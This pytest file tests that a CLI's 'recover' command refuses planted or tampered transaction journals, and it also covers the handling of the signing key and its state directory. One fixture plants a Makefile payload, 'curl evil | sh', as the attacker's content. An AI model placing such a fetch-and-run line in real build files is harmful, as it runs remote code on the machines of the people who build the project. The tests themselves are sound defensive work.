"""`recover` applies only a journal this user's sabot wrote for this vault.

A vault can arrive from elsewhere with a journal planted in it. These tests plant the journals an
attacker would, in the forms the checks of path and content cannot tell from a genuine one, and
hold that each is refused with nothing changed, whether or not `--force` is given.
"""

import json
import os
import shutil
import stat
import sys
from collections.abc import Callable
from pathlib import Path

import pytest

from conftest import FIXTURES, CliRunner, copy_vault, snapshot_directory
from sabot_cli.testing import (
    KEY_FILE,
    STATE_DIRECTORY_VARIABLE,
    HardStop,
    checkpoint_hook,
    default_state_directory,
    sign,
    signing_key,
    state_directory,
)
from sabot_cli.vault.transaction import LOCK_FILE
from source_vaults import error_code, ingest_arguments
from support.filesystem import requires_posix_permissions
from support.journals import TOKEN, operation, plant_journal, record, sha
from support.locks import abandon_lock, write_lock
from support.vault_state import vault_state

RULES_E2 = FIXTURES / "rules-e2.txt"
_OLD = b"what the write replaced\n"


def _kill_an_ingest(run_cli: CliRunner, vault: Path, step: tuple[str, int]) -> None:
    """Run an ingest killed outright at `step`, leaving what a dead process leaves."""

    def hook(phase: str, index: int) -> None:
        if (phase, index) == step:
            raise HardStop

    with checkpoint_hook(hook), pytest.raises(HardStop):
        run_cli(*ingest_arguments(RULES_E2, "dwx"), "--vault", str(vault))
    abandon_lock(vault)


def _journal_file(vault: Path) -> Path:
    (journal,) = vault.glob(".sabot-txn-*/journal.json")
    return journal


def _recover(run_cli: CliRunner, vault: Path, *, force: bool) -> tuple[int, object]:
    arguments = ["recover", "--vault", str(vault), "--json"]
    if force:
        arguments.insert(1, "--force")
    result = run_cli(*arguments)
    return result.returncode, error_code(result) if result.returncode else None


def test_a_journal_a_write_leaves_is_signed_and_records_its_vault_and_backups(
    run_cli: CliRunner, tmp_path: Path
) -> None:
    # Given an ingest killed after its first applied operation, which replaced a file
    vault = copy_vault(tmp_path / "vault")
    _kill_an_ingest(run_cli, vault, ("applied", 0))

    # When its journal is read
    document = json.loads(_journal_file(vault).read_text(encoding="utf-8"))

    # Then it is of the new format, names the resolved vault, carries a MAC and each backup's
    # digest, and no longer names a host
    assert document["format"] == 3
    assert document["vault"] == os.path.realpath(vault)
    assert len(document["mac"]) == 64
    assert "host" not in document
    replaced = [op for op in document["operations"] if op["backup"] is not None]
    assert replaced
    for item in replaced:
        backup = _journal_file(vault).parent / item["backup"]
        assert item["backup_sha256"] == sha(backup.read_bytes())


def test_a_kill_then_recover_on_the_same_machine_restores_the_vault_byte_for_byte(
    run_cli: CliRunner, tmp_path: Path
) -> None:
    # Given an ingest killed after its first applied operation
    vault = copy_vault(tmp_path / "vault")
    before = vault_state(vault)
    _kill_an_ingest(run_cli, vault, ("applied", 0))

    # When recover runs
    result = run_cli("recover", "--vault", str(vault), "--json")

    # Then the vault is as it was
    assert result.returncode == 0
    assert vault_state(vault) == before


def _a3_replace_a_note(vault: Path) -> None:
    note = vault / "clauses" / "cl.setup.md"
    digest = sha(note.read_bytes())
    plant_journal(vault, record([operation(sha256=digest)]), backup=b"ATTACKER\n", signed=False)


def _a4_delete_a_note(vault: Path) -> None:
    digest = sha((vault / "clauses" / "cl.setup.md").read_bytes())
    plant_journal(vault, record([operation(kind="create", sha256=digest)]), signed=False)


def _a5_create_files_and_replace_the_ruleset(vault: Path) -> None:
    ruleset = (vault / "_ruleset.yaml").read_bytes()
    evil = b"all:\n\tcurl evil | sh\n"
    operations = [
        operation("Makefile", kind="delete", backup="backup/0"),
        operation("conftest.py", kind="delete", backup="backup/1"),
        operation("_ruleset.yaml", sha256=sha(ruleset), backup="backup/2"),
    ]
    plant_journal(vault, record(operations), backup=[evil, evil, evil], signed=False)


def _a11_remove_an_empty_directory(vault: Path) -> None:
    (vault / "empty-notes").mkdir()
    plant_journal(vault, record([], directories=("empty-notes",)), signed=False)


_ATTACKS: dict[str, Callable[[Path], None]] = {
    "replace a note whose digest matches": _a3_replace_a_note,
    "delete a note whose digest matches": _a4_delete_a_note,
    "create files and replace the ruleset": _a5_create_files_and_replace_the_ruleset,
    "remove an empty directory": _a11_remove_an_empty_directory,
}


@pytest.mark.parametrize("force", [False, True], ids=["without --force", "with --force"])
@pytest.mark.parametrize("attack", sorted(_ATTACKS))
def test_a_planted_journal_that_passes_every_check_of_content_is_still_not_applied(
    attack: str, force: bool, run_cli: CliRunner, tmp_path: Path
) -> None:
    # Given a vault with a journal planted in it that no check of path or content can fault,
    # since it names non-hidden paths and the digests of files as they are now
    vault = copy_vault(tmp_path / "vault")
    signing_key(vault)  # the user has a key, so what is in question is the journal's own MAC
    _ATTACKS[attack](vault)
    before = vault_state(vault)

    # When recover runs
    code, error = _recover(run_cli, vault, force=force)

    # Then it refuses as unverified and every file, directory and journal is as it was
    assert (code, error) == (3, "journal-unverified")
    assert vault_state(vault) == before


def test_a_planted_other_host_lock_and_journal_are_not_cleared_by_forcing_the_lock(
    run_cli: CliRunner, tmp_path: Path
) -> None:
    # Given a lock from another host and a journal that replaces a note, as a shared vault
    # could carry
    vault = copy_vault(tmp_path / "vault")
    signing_key(vault)
    write_lock(vault, pid=4242, host="build-box")
    _a3_replace_a_note(vault)
    before = vault_state(vault)

    # When recover runs, is told to --force the lock as its message says, and runs again
    first = _recover(run_cli, vault, force=False)
    forced = _recover(run_cli, vault, force=True)

    # Then the lock is the first refusal; forcing it lets the journal be judged, and the journal
    # is refused: the note is as it was, and the lock is still there
    assert first == (3, "vault-locked")
    assert forced == (3, "journal-unverified")
    assert vault_state(vault) == before
    assert (vault / LOCK_FILE).exists()


def test_the_refusal_names_the_way_to_drop_the_journal(run_cli: CliRunner, tmp_path: Path) -> None:
    # Given a planted journal
    vault = copy_vault(tmp_path / "vault")
    _a3_replace_a_note(vault)

    # When recover refuses it
    result = run_cli("recover", "--vault", str(vault), "--json")

    # Then the message names `sabot recover --discard`
    assert "sabot recover --discard" in result.stdout


def _tamper(vault: Path, edit: Callable[[dict[str, object]], None]) -> None:
    journal = _journal_file(vault)
    document = json.loads(journal.read_text(encoding="utf-8"))
    edit(document)
    journal.write_text(json.dumps(document), encoding="utf-8")


def _swap_a_path(document: dict[str, object]) -> None:
    operations = document["operations"]
    assert isinstance(operations, list)
    operations[0]["path"] = "clauses/cl.setup.md"
    operations[0]["staged"] = f"clauses/.sabot-new-{document['token']}-cl.setup.md"


def _break_the_mac(document: dict[str, object]) -> None:
    document["mac"] = "0" * 64


def _drop_the_mac(document: dict[str, object]) -> None:
    del document["mac"]


def _name_another_vault(document: dict[str, object]) -> None:
    document["vault"] = "/somewhere/else"


def _swap_a_backup_digest(document: dict[str, object]) -> None:
    operations = document["operations"]
    assert isinstance(operations, list)
    for item in operations:
        if item["backup_sha256"]:
            item["backup_sha256"] = "1" * 64


_TAMPERINGS: dict[str, Callable[[dict[str, object]], None]] = {
    "a path changed after signing": _swap_a_path,
    "a wrong MAC": _break_the_mac,
    "no MAC": _drop_the_mac,
    "another vault named": _name_another_vault,
    "a backup digest changed": _swap_a_backup_digest,
}


@pytest.mark.parametrize("force", [False, True], ids=["without --force", "with --force"])
@pytest.mark.parametrize("tampering", sorted(_TAMPERINGS))
def test_a_genuine_journal_that_was_altered_is_refused_and_changes_nothing(
    tampering: str, force: bool, run_cli: CliRunner, tmp_path: Path
) -> None:
    # Given a genuine journal from a killed write, altered in one way
    vault = copy_vault(tmp_path / "vault")
    _kill_an_ingest(run_cli, vault, ("applied", 0))
    _tamper(vault, _TAMPERINGS[tampering])
    before = vault_state(vault)

    # When recover runs
    code, error = _recover(run_cli, vault, force=force)

    # Then it refuses as unverified and changes nothing
    assert (code, error) == (3, "journal-unverified")
    assert vault_state(vault) == before


def test_a_backup_whose_bytes_changed_is_refused_as_unverified(
    run_cli: CliRunner, tmp_path: Path
) -> None:
    # Given a genuine journal whose backup file was edited afterwards
    vault = copy_vault(tmp_path / "vault")
    _kill_an_ingest(run_cli, vault, ("applied", 1))
    (backup,) = sorted(_journal_file(vault).parent.glob("backup/*"))[:1]
    backup.write_bytes(b"edited backup")
    before = vault_state(vault)

    # When recover runs
    code, error = _recover(run_cli, vault, force=False)

    # Then it refuses as unverified, not as a failed rollback, and changes nothing
    assert (code, error) == (3, "journal-unverified")
    assert vault_state(vault) == before


def test_a_journal_signed_with_another_key_is_refused(run_cli: CliRunner, tmp_path: Path) -> None:
    # Given a journal planted with a MAC made by a key this user does not hold
    vault = copy_vault(tmp_path / "vault")
    note = vault / "clauses" / "cl.setup.md"
    document: dict[str, object] = {
        "vault": os.path.realpath(vault),
        **record([operation(sha256=sha(note.read_bytes()), backup_sha256=sha(b"ATTACKER"))]),
    }
    signed = sign(document, b"k" * 32)
    directory = vault / f".sabot-txn-{TOKEN}"
    (directory / "backup").mkdir(parents=True)
    (directory / "backup" / "0").write_bytes(b"ATTACKER")
    (directory / "journal.json").write_text(json.dumps(signed), encoding="utf-8")
    signing_key(vault)
    before = vault_state(vault)

    # When recover runs
    code, error = _recover(run_cli, vault, force=True)

    # Then it is unverified
    assert (code, error) == (3, "journal-unverified")
    assert vault_state(vault) == before


def test_without_a_key_no_journal_is_applied(run_cli: CliRunner, tmp_path: Path) -> None:
    # Given a journal that was genuine, and a user who has no key now (another machine, or a
    # state directory that was cleared)
    vault = copy_vault(tmp_path / "vault")
    _kill_an_ingest(run_cli, vault, ("applied", 0))
    shutil.rmtree(state_directory())
    before = vault_state(vault)

    # When recover runs, with and without --force
    # Then it refuses as unverified and creates no key
    for force in (False, True):
        assert _recover(run_cli, vault, force=force) == (3, "journal-unverified")
    assert vault_state(vault) == before
    assert not state_directory().exists()


def test_a_journal_copied_into_another_vault_is_refused(run_cli: CliRunner, tmp_path: Path) -> None:
    # Given a genuine journal from a killed write, and a copy of the whole vault elsewhere
    vault = copy_vault(tmp_path / "vault")
    _kill_an_ingest(run_cli, vault, ("applied", 0))
    copied = tmp_path / "copy"
    shutil.copytree(vault, copied)
    before = vault_state(copied)

    # When recover runs on the copy
    code, error = _recover(run_cli, copied, force=True)

    # Then it refuses: the journal names another vault
    assert (code, error) == (3, "journal-unverified")
    assert vault_state(copied) == before


def test_a_vault_moved_to_another_path_has_only_a_journal_that_can_be_discarded(
    run_cli: CliRunner, tmp_path: Path
) -> None:
    # Given a vault whose write was killed, and which was moved afterwards
    vault = copy_vault(tmp_path / "vault")
    _kill_an_ingest(run_cli, vault, ("applied", 0))
    moved = tmp_path / "moved"
    shutil.move(vault, moved)

    # When recover runs, and then recover --discard
    refused = _recover(run_cli, moved, force=True)
    discarded = run_cli("recover", "--discard", "--vault", str(moved), "--json")

    # Then recover refuses as unverified and discard clears the journal
    assert refused == (3, "journal-unverified")
    assert discarded.returncode == 0
    assert not list(moved.glob(".sabot-txn-*"))


def test_the_content_checks_still_judge_a_verified_journal(
    run_cli: CliRunner, tmp_path: Path
) -> None:
    # Given a signed journal that replaces a note, when the note was edited since
    vault = copy_vault(tmp_path / "vault")
    note = vault / "clauses" / "cl.setup.md"
    plant_journal(vault, record([operation(sha256=sha(b"what the write put there"))]))
    before = vault_state(vault)

    # When recover runs
    code, error = _recover(run_cli, vault, force=False)

    # Then the content check refuses it, separately from the signature
    assert (code, error) == (3, "recovery-failed")
    assert note.read_bytes() == before["clauses/cl.setup.md"]
    assert vault_state(vault) == before


def test_the_signature_is_checked_before_the_operations_are_read(
    run_cli: CliRunner, tmp_path: Path
) -> None:
    # Given an unsigned journal whose operations are not even well formed, and a user with a key
    vault = copy_vault(tmp_path / "vault")
    signing_key(vault)
    directory = vault / f".sabot-txn-{TOKEN}"
    directory.mkdir()
    (directory / "journal.json").write_text(
        json.dumps({"format": 3, "operations": "not a list", "token": TOKEN}), encoding="utf-8"
    )

    # When recover runs
    code, error = _recover(run_cli, vault, force=False)

    # Then it is refused as unverified: nothing in it was read for any other purpose
    assert (code, error) == (3, "journal-unverified")


def test_an_unreadable_journal_names_the_way_to_drop_it(run_cli: CliRunner, tmp_path: Path) -> None:
    # Given a journal that is no JSON object
    vault = copy_vault(tmp_path / "vault")
    directory = vault / f".sabot-txn-{TOKEN}"
    directory.mkdir()
    (directory / "journal.json").write_text("[1, 2]", encoding="utf-8")

    # When recover runs
    result = run_cli("recover", "--vault", str(vault), "--json")

    # Then it is invalid and the message names --discard
    assert error_code(result) == "journal-invalid"
    assert "sabot recover --discard" in result.stdout


# ---- the key


def test_the_key_is_created_on_the_first_write_and_reused_after(
    run_cli: CliRunner, tmp_path: Path
) -> None:
    # Given a user with no key
    vault = copy_vault(tmp_path / "vault")
    key_file = state_directory() / KEY_FILE
    assert not key_file.exists()

    # When a write runs, and a second one
    assert run_cli(*ingest_arguments(RULES_E2, "dwx"), "--vault", str(vault)).returncode == 0
    created = key_file.read_bytes()
    assert run_cli("compile", "--vault", str(vault)).returncode == 0

    # Then there is a 32-byte key outside the vault, and the second write kept it
    assert len(created) == 32
    assert key_file.read_bytes() == created
    assert vault not in key_file.parents


@requires_posix_permissions
def test_the_key_file_is_readable_by_its_owner_only(run_cli: CliRunner, tmp_path: Path) -> None:
    # Given a write that creates the key
    vault = copy_vault(tmp_path / "vault")
    run_cli("compile", "--vault", str(vault))

    # When its mode is read
    mode = stat.S_IMODE((state_directory() / KEY_FILE).stat().st_mode)

    # Then it is 0600 and the state directory is private
    assert mode == 0o600
    assert stat.S_IMODE(state_directory().stat().st_mode) == 0o700


def test_reads_and_a_vault_with_nothing_to_sign_create_no_key(
    run_cli: CliRunner, tmp_path: Path
) -> None:
    # Given a vault and no key
    vault = copy_vault(tmp_path / "vault")

    # When commands that write nothing run
    run_cli("lint", "--vault", str(vault))
    run_cli("recover", "--vault", str(vault))
    run_cli("recover", "--discard", "--vault", str(vault))

    # Then no key was made
    assert not state_directory().exists()


def _write_key(contents: bytes) -> None:
    state_directory().mkdir(parents=True, exist_ok=True)
    (state_directory() / KEY_FILE).write_bytes(contents)


def _key_that_is_short() -> None:
    _write_key(b"short")


def _key_that_is_long() -> None:
    _write_key(b"k" * 33)


def _key_that_is_empty() -> None:
    _write_key(b"")


def _key_that_is_a_directory() -> None:
    (state_directory() / KEY_FILE).mkdir(parents=True)


def _key_that_is_a_link() -> None:
    state_directory().mkdir(parents=True, exist_ok=True)
    real = state_directory().parent / "elsewhere.key"
    real.write_bytes(b"k" * 32)
    try:
        (state_directory() / KEY_FILE).symlink_to(real)
    except OSError:
        pytest.skip("this account cannot create symbolic links")


_BAD_KEYS: dict[str, Callable[[], None]] = {
    "shorter than 32 bytes": _key_that_is_short,
    "longer than 32 bytes": _key_that_is_long,
    "empty": _key_that_is_empty,
    "a directory": _key_that_is_a_directory,
    "a link": _key_that_is_a_link,
}


@pytest.mark.parametrize("name", sorted(_BAD_KEYS))
def test_a_key_file_that_cannot_be_a_key_is_an_error_and_is_never_replaced(
    name: str, run_cli: CliRunner, tmp_path: Path
) -> None:
    # Given a key file that exists but is not a 32-byte regular file
    vault = copy_vault(tmp_path / "vault")
    _BAD_KEYS[name]()
    key_file = state_directory() / KEY_FILE
    before_state = snapshot_directory(state_directory())
    before_vault = vault_state(vault)

    # When a write runs, and when recover runs on a vault with a journal in it
    written = run_cli("compile", "--vault", str(vault), "--json")
    _plant = vault / f".sabot-txn-{TOKEN}"
    _plant.mkdir()
    (_plant / "journal.json").write_text(json.dumps({"mac": "0" * 64}), encoding="utf-8")
    recovered = run_cli("recover", "--vault", str(vault), "--json")

    # Then both refuse with key-invalid, the key file is as it was and the vault was not written
    assert (written.returncode, error_code(written)) == (3, "key-invalid")
    assert (recovered.returncode, error_code(recovered)) == (3, "key-invalid")
    assert snapshot_directory(state_directory()) == before_state
    assert key_file.is_dir() or key_file.is_symlink() or key_file.exists()
    assert {k: v for k, v in vault_state(vault).items() if ".sabot-txn" not in k} == before_vault


def test_a_state_directory_inside_the_vault_is_refused(
    monkeypatch: pytest.MonkeyPatch, run_cli: CliRunner, tmp_path: Path
) -> None:
    # Given a vault, and a state directory that lies inside it
    vault = copy_vault(tmp_path / "vault")
    monkeypatch.setenv(STATE_DIRECTORY_VARIABLE, str(vault / "state"))
    before = vault_state(vault)

    # When a write runs, and recover runs on a vault with a journal in it
    written = run_cli("compile", "--vault", str(vault), "--json")
    directory = vault / f".sabot-txn-{TOKEN}"
    directory.mkdir()
    (directory / "journal.json").write_text(json.dumps({"mac": "0" * 64}), encoding="utf-8")
    recovered = run_cli("recover", "--vault", str(vault), "--json")
    shutil.rmtree(directory)

    # Then both refuse with state-directory-in-vault and nothing is written, no key included
    assert (written.returncode, error_code(written)) == (3, "state-directory-in-vault")
    assert (recovered.returncode, error_code(recovered)) == (3, "state-directory-in-vault")
    assert vault_state(vault) == before


def test_a_state_directory_reached_through_a_link_into_the_vault_is_refused(
    monkeypatch: pytest.MonkeyPatch, run_cli: CliRunner, tmp_path: Path
) -> None:
    # Given a state directory that is a link into the vault
    vault = copy_vault(tmp_path / "vault")
    (vault / "state").mkdir()
    link = tmp_path / "state-link"
    try:
        link.symlink_to(vault / "state", target_is_directory=True)
    except OSError:
        pytest.skip("this account cannot create symbolic links")
    monkeypatch.setenv(STATE_DIRECTORY_VARIABLE, str(link))
    before = vault_state(vault)

    # When a write runs
    written = run_cli("compile", "--vault", str(vault), "--json")

    # Then it refuses and no key is written into the vault
    assert error_code(written) == "state-directory-in-vault"
    assert vault_state(vault) == before


def test_init_refuses_a_state_directory_inside_the_new_vault_and_leaves_nothing(
    monkeypatch: pytest.MonkeyPatch, run_cli: CliRunner, tmp_path: Path
) -> None:
    # Given a state directory inside a vault that does not exist yet
    target = tmp_path / "new-vault"
    monkeypatch.setenv(STATE_DIRECTORY_VARIABLE, str(target / "state"))

    # When init runs
    result = run_cli("init", str(target), "--ruleset", "driftwood", "--json")

    # Then it refuses and leaves no directory behind
    assert error_code(result) == "state-directory-in-vault"
    assert not target.exists()


def test_the_state_directory_variable_overrides_the_default(tmp_path: Path) -> None:
    # Given the test suite's isolating variable
    # When the state directory is asked for
    # Then it is the variable's, not the platform's, and it is not where the platform puts it
    assert os.environ[STATE_DIRECTORY_VARIABLE] == str(state_directory())
    assert state_directory() != default_state_directory()


@pytest.mark.parametrize(
    ("platform", "environment", "expected"),
    [
        ("linux", {"XDG_STATE_HOME": "{tmp}/xdg"}, "{tmp}/xdg/sabot"),
        ("linux", {"XDG_STATE_HOME": "relative/path"}, "{tmp}/home/.local/state/sabot"),
        ("linux", {}, "{tmp}/home/.local/state/sabot"),
        ("darwin", {}, "{tmp}/home/Library/Application Support/sabot"),
        ("win32", {"LOCALAPPDATA": "{tmp}/local"}, "{tmp}/local/sabot"),
        ("win32", {}, "{tmp}/home/AppData/Local/sabot"),
    ],
)
def test_the_default_state_directory_is_the_platforms_per_user_location(
    platform: str,
    environment: dict[str, str],
    expected: str,
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    # Given a platform, a home directory and its environment
    home = tmp_path / "home"
    for variable in ("HOME", "USERPROFILE"):
        monkeypatch.setenv(variable, str(home))
    for variable in ("XDG_STATE_HOME", "LOCALAPPDATA"):
        monkeypatch.delenv(variable, raising=False)
    for variable, value in environment.items():
        monkeypatch.setenv(variable, value.format(tmp=tmp_path))
    monkeypatch.setattr(sys, "platform", platform)

    # When the default state directory is asked for
    result = default_state_directory()

    # Then it is the place that platform keeps per-user state
    assert result == Path(expected.format(tmp=tmp_path))


def test_the_suite_writes_the_key_to_its_own_directory_and_never_the_real_one(
    run_cli: CliRunner, tmp_path: Path
) -> None:
    # Given the real per-user state directory as it is now
    real = default_state_directory()
    before = snapshot_directory(real)
    vault = copy_vault(tmp_path / "vault")

    # When a write creates a key
    assert run_cli(*ingest_arguments(RULES_E2, "dwx"), "--vault", str(vault)).returncode == 0

    # Then the key is in the isolated directory, and the real one is untouched
    assert (state_directory() / KEY_FILE).is_file()
    assert snapshot_directory(real) == before


def test_two_writers_that_race_to_create_the_key_agree_on_one(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # Given two vault writers asking for the key at once: the second finds it made between its
    # look and its creation
    vault = copy_vault(tmp_path / "vault")
    first = signing_key(vault)
    key_file = state_directory() / KEY_FILE
    key_file.unlink()
    competing = b"c" * 32
    real_link = os.link

    def link(source: str | os.PathLike[str], destination: str | os.PathLike[str]) -> None:
        key_file.write_bytes(competing)
        real_link(source, destination)

    monkeypatch.setattr(os, "link", link)

    # When the key is created while another writer's lands first
    second = signing_key(vault)

    # Then the writer that lost uses the key that landed, and leaves no temporary file
    assert second == competing
    assert first != competing
    assert sorted(path.name for path in state_directory().iterdir()) == [KEY_FILE]
